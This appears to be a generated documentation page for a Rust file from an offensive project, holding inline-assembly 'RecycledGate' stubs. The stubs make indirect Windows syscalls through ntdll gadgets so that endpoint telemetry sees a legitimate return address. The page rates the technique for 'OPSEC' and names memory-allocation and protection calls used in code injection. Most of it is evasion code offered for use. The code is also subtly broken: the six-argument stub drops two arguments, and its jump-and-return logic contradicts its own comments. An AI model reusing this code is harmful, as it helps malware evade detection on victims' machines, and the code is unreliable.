# recycled_gate_stubs

| Field | Value |
|-------|-------|
| **Source** | `source-extracts/recycled_gate_stubs.rs` |
| **Lines** | 52 |
| **Inline ASM** | Yes |
| **Unsafe blocks** | 2 |

## Public API

### `recycled_1` `unsafe` (line 13)
```rust
pub unsafe fn recycled_1(ssn: u32, gadget: usize, a1: usize) -> i32
```

### `recycled_6` `unsafe` (line 31)
```rust
pub unsafe fn recycled_6(
```

## Key Dependencies

- `use core::arch::asm;`

## Full Source

```rust
// Source: dark_crystal/crates/core/src/sys_recycled.rs
// Technique: T001 - RecycledGate (Indirect Syscalls via ntdll gadgets)
// Tier: S | OPSEC: 9.5/10
//
// Each stub: moves arg1 to r10, loads SSN into eax, JMPs to ntdll gadget (0F 05 C3).
// The syscall instruction executes from ntdll's .text section, so ETW-TI sees
// a legitimate return address. The ret (C3) after syscall pops back to our stub.

use core::arch::asm;

/// Execute a 1-argument NT syscall via RecycledGate.
#[inline(never)]
pub unsafe fn recycled_1(ssn: u32, gadget: usize, a1: usize) -> i32 {
    let status: i32;
    asm!(
        "mov r10, rcx",        // a1 → r10 (NT calling convention)
        "mov eax, {ssn:e}",    // SSN → eax
        "jmp {gadget}",        // JMP to ntdll syscall;ret gadget
        ssn = in(reg) ssn,
        gadget = in(reg) gadget,
        in("rcx") a1,
        lateout("rax") status,
        clobber_abi("system"),
        options(nostack)
    );
    status
}

/// 6-argument variant (covers NtAllocateVirtualMemory, NtProtectVirtualMemory, etc.)
#[inline(never)]
pub unsafe fn recycled_6(
    ssn: u32, gadget: usize,
    a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize,
) -> i32 {
    let status: i32;
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        // a5, a6 already on shadow stack (pushed by Rust ABI)
        "jmp {gadget}",
        ssn = in(reg) ssn,
        gadget = in(reg) gadget,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        lateout("rax") status,
        clobber_abi("system"),
        options(nostack)
    );
    status
}

```